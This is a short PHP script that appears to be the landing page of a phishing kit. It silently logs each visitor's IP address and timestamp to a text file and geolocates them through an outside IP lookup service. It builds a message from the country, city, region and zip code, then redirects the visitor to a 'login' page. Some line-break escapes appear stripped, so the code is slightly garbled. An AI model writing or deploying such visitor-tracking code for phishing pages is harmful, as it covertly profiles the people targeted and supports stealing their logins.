<?php

include ('block/block.php');



$ip = getenv("REMOTE_ADDR");


$file = fopen("v.txt","a");


fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."             ");

$IP_LOOKUP = @json_decode(file_get_contents("http://ip-api.com/json/".$ip));
$COUNTRY = $IP_LOOKUP->country . "rn";
$CITY    = $IP_LOOKUP->city . "rn";
$REGION  = $IP_LOOKUP->region . "rn";
$STATE   = $IP_LOOKUP->regionName . "rn";
$ZIPCODE = $IP_LOOKUP->zip . "rn";

$msg=$ip."nCountry : ".$COUNTRY."City: " .$CITY."Region : " .$REGION."State: " .$STATE."Zip : " .$ZIPCODE;




header("Location: login");?>